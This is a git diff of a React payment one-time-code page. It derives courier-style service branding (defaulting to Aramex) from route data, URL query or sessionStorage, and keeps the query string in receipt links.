@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -16,12 +16,18 @@ import {
 } from "@/components/ui/input-otp";
 
 const PaymentOTP = () => {
-  const { id, paymentId } = useParams();
+  const { id: rawIdParam, paymentId } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
+  const shareId = rawIdParam || "";
   const { data: payment, refetch } = usePayment(paymentId);
-  const { data: link } = useLink(payment?.link_id || undefined);
+  const { data: link } = useLink(shareId);
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
   const updatePayment = useUpdatePayment();
+  const urlServiceKey = useMemo(
+    () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
+    []
+  );
   
   const [otp, setOtp] = useState("");
   const [error, setError] = useState("");
@@ -29,9 +35,16 @@ const PaymentOTP = () => {
   const [timeLeft, setTimeLeft] = useState(180); // 3 minutes countdown
   
   // Get service branding
-  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
+  const sessionServiceKey = typeof window !== "undefined" ? sessionStorage.getItem('serviceKey') : null;
+  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || urlServiceKey || sessionServiceKey || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+
+  useEffect(() => {
+    if (serviceKey) {
+      sessionStorage.setItem('serviceKey', serviceKey);
+    }
+  }, [serviceKey]);
   
   // Countdown timer
   useEffect(() => {
@@ -136,7 +149,7 @@ const PaymentOTP = () => {
         paymentId: payment.id,
         updates: {
           status: "confirmed",
-          receipt_url: `/pay/${id}/receipt/${payment.id}`,
+          receipt_url: `/pay/${shareId}/receipt/${payment.id}${currentSearch}`,
         },
       });
       
@@ -145,7 +158,7 @@ const PaymentOTP = () => {
         description: "تم تأكيد الدفع بنجاح",
       });
       
-      navigate(`/pay/${id}/receipt/${payment.id}`);
+      navigate(`/pay/${shareId}/receipt/${payment.id}${currentSearch}`);
     } else {
       // Wrong OTP
       const newAttempts = payment.attempts + 1;
